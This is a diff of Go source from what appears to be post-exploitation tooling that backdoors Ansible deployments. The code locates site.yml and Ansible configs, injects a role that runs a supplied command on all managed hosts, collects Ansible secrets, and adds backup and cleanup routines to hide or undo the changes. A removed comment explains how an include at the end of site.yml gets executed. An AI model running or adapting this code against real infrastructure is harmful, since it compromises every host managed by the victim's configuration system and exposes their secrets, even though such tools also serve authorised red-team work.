@@ -42,16 +42,13 @@ var (
 	suppliedFilename string
 	keys             []string
 	inspect          bool
-	suppliedNodes    string
 	uploadFilePath   = a.FilePath
 	cleanup          bool
 	cleanupFile      = a.CleanupFile
+	ansibleBackupLoc = a.AnsibleBackupLoc
 )
 
 func init() {
-	flag.BoolVar(&inspect, "i", false, "Used to retrieve information about a system.")
-	flag.StringVar(&suppliedNodes, "n", "", "Space separated nodes")
-	flag.StringVar(&suppliedFilename, "f", "", "Path to the file upload to be used with ansible playbook")
 	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
 }
 
@@ -80,30 +77,6 @@ func findAnsibleConfig() []string {
 }
 
 func backdoorSite(siteLoc string) {
-	/*
-		site.yml
-			---
-			- hosts: all
-			  become: true
-			  gather_facts: false
-
-			- include: control.yml
-			- include: webserver.yml
-			- include: loadbalancer.yml
-			- include: blog.yml
-
-			- name: test intermittent
-			  host: control
-			  roles:
-				- control
-
-			- include: badbad
-
-
-			The above is an example site.yml which proves that including anything at the bottom line will be ran. SO LONG as there are no errors!!!
-
-			For now a simple backdoor is gonna be just -include: backdoor.yml
-	*/
 	yesRoles := regexp.MustCompile(`(?sm)(hosts: all.*?roles:)`)
 	noRoles := regexp.MustCompile(`(?sm)(hosts: all.*?)^-`)
 	comments := regexp.MustCompile(`#.*`)
@@ -162,7 +135,7 @@ func createRole(siteLoc string, ansibleRole string, cmd string) {
 		msg("Successfully created the %s role at %s", ansibleRole, mainyml)
 		msg("Adding folder %s to cleanup file", roleFolders)
 		// Track the folders for clean up purposes
-		// moseutils.TrackChanges(cleanupFile, moduleLoc)
+		moseutils.TrackChanges(cleanupFile, roleLoc)
 		if uploadFileName != "" {
 			ansibleFiles := filepath.Join(roleLoc, "files")
 
@@ -290,13 +263,62 @@ func getAnsibleSecrets(siteLoc string, ansibleCfgs []string) {
 	return
 }
 
+func doCleanup(siteLoc string) {
+	moseutils.TrackChanges(cleanupFile, cleanupFile)
+	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run?", osTarget)
+	if err != nil {
+		log.Fatal("Quitting...")
+	}
+	moseutils.RemoveTracker(cleanupFile, osTarget, ans)
+
+	path := siteLoc
+	if ansibleBackupLoc != "" {
+		path = filepath.Join(ansibleBackupLoc, filepath.Base(siteLoc))
+	}
+
+	path = path + ".bak.mose"
+
+	if !moseutils.FileExists(path) {
+		log.Printf("Backup file %s does not exist, skipping", path)
+	}
+	ans2 := false
+	if !ans {
+		ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", siteLoc, path), osTarget)
+		if err != nil {
+			log.Fatal("Quitting...")
+		}
+	}
+	if ans || ans2 {
+		moseutils.CpFile(path, siteLoc)
+		os.Remove(path)
+	}
+	os.Exit(0)
+}
+
+func backupSite(siteLoc string) {
+	path := siteLoc
+	if ansibleBackupLoc != "" {
+		path = filepath.Join(ansibleBackupLoc, filepath.Base(siteLoc))
+	}
+	if !moseutils.FileExists(path + ".bak.mose") {
+		moseutils.CpFile(siteLoc, path+".bak.mose")
+		return
+	}
+	log.Printf("Backup of the site.yml (%v.bak.mose) already exists.", siteLoc)
+	return
+}
+
 func main() {
 	// parse args
+	flag.Parse()
 
 	// gonna assume not root then we screwed
 	utils.CheckRoot()
-
 	ansibleCfgs := findAnsibleConfig()
+
+	if uploadFilePath != "" {
+		moseutils.TrackChanges(cleanupFile, uploadFilePath)
+	}
 
 	found, _ := moseutils.FindBin("ansible", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
 	if !found {
@@ -307,6 +329,11 @@ func main() {
 		log.Fatalf("site.yml not found, exiting...")
 	}
 
+	if cleanup {
+		doCleanup(siteLoc)
+	}
+
+	backupSite(siteLoc)
 	msg("Backdooring the %s site.yml to run %s on all ansible roles, please wait...", siteLoc, bdCmd)
 	backdoorSite(siteLoc)
 	createRole(siteLoc, ansibleRole, bdCmd)
